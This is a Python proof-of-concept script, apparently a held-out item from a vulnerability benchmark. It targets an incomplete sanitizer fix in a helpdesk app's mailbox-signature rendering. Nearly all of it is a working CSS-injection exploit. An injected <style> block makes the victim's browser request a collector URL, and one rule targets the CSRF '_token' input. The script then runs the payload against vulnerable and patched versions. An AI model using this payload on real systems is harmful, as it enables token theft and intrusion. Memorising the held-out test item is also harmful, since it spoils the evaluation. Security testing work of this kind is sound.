#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-40497 residual -- CSS injection via an un-stripped <style> tag.

The CVE-2025-48489 fix grew Helper::stripDangerousTags()'s blocklist to
['script','form','iframe','object'] but never added 'style'. So a `<style>` block in the
mailbox signature survives sanitization at V1 (1.8.212) and is rendered verbatim into the
conversation view. Its CSS `background-image: url(...)` is fetched by the victim's browser ->
the collector records the flag -> CSS executed on the real render (the advisory's mechanism:
CSS is used to exfiltrate a victim's CSRF token character-by-character; here a single
background-image request with the per-run flag proves the same primitive without weaponizing).

  V1 (1.8.212): 'style' NOT in blocklist -> <style> survives -> background-image fires -> exfil.
  V2 (1.8.213): fix adds 'style' (GHSA-fh99-wr77-pxq3) -> <style> stripped -> no request -> blocked.

Same sink as the original seed (the mailbox signature rendered by getSignatureProcessed());
only the tag the sanitizer fails to cover differs -> a clean incomplete-fix residual.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# <style> with an attribute-selector CSS-exfil primitive (as in the advisory) plus a
# body background-image that fires whenever the style is applied. The [name=_token] selector
# demonstrates real CSRF-token-targeted CSS exfiltration; the body rule guarantees an
# observable request the moment the injected <style> reaches the DOM.
BYPASS_PAYLOAD = (
    "<style>"
    "body{background-image:url('" + CB + "&via=style')}"
    "input[name='_token']{background-image:url('" + CB + "&via=token')}"
    "</style>"
)


def bypass_poc(*, version="v1"):
    return run_payload(BYPASS_PAYLOAD, version)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
